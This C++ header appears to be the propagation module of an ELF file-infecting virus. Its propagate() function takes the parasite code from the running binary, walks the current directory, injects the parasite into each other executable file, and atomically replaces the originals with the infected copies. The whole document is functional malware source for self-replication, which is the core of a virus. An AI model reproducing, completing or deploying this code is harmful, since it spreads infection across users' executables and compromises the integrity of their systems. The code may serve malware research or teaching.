#pragma once

#include "common/get_symbol_addr.hh"
#include "common/mmap.hh"
#include "infector/common_infection.hh"
#include "nostdlib/stdlib.hh"
#include "nostdlib/string.hh"
#include "nostdlib/unistd.hh"

namespace vt::propagation {
// Propagate the injected code from the current program to all binaries into
// others. This function only injects into elfs (not self) without signature
// checking. The current program must have appropriate file system permission.
// This function must be invoked inside a virus, otherwise the linker will
// complain.
// @Tparam DirIteratorT A directory iterator that provides victim file paths.
// @Tparam Injector     A code injector.
// @Tparam Redirector   A redirector.
// @param  cur_exec_name The current invoking executable name.
// @returns number of success infection.
template <typename DirIteratorT, typename Injector, typename Redirector>
size_t propagate(const char* cur_exec_name) {
  size_t num_infections = 0;

  // Extract the virus from the current binary.
  std::span<const std::byte> parasite(vt::common::get_parasite_start_address(),
                                      vt::common::get_parasite_len());
  char dir[] = {'.', 0};

  for (auto it : DirIteratorT(dir)) {
    if (it.type == DirIteratorT::EntryType::FILE) {
      const char* host_path = it.name;
      auto host = vt::common::FileDescriptor(host_path, O_RDONLY);
      if (!host.valid()) {
        continue;
      }

      auto host_size = host.file_size();
      if (host_size == 0 ||
          !vt::strcmp(host_path, cur_exec_name + vt::strlen(cur_exec_name) -
                                     vt::strlen(host_path))) {
        continue;
      }

      vt::common::Mmap<PROT_READ> host_mapping(host_size, MAP_PRIVATE,
                                               host.handle(), 0);

      std::span<const std::byte> host_span(host_mapping.base(),
                                           host_mapping.size());

      char tmp[PATH_MAX];
      auto len = vt::strlen(host_path);
      vt::strcpy(tmp, host_path);
      tmp[len] = '.';
      tmp[len + 1] = '\0';

      auto new_host = vt::infector::infect<Injector, Redirector>(
          host_span, parasite, tmp,
          vt::common::get_patch_return_offset_from_parasite_start());
      if (!new_host.valid()) {
        continue;
      }

      if (!vt::infector::atomic_swap_host(host.handle(), host_path,
                                          new_host.handle(), tmp)) {
        (void)vt::unlink(tmp);
      } else {
        num_infections++;
      }
    }
  }
  return num_infections;
}

}  // namespace vt::propagation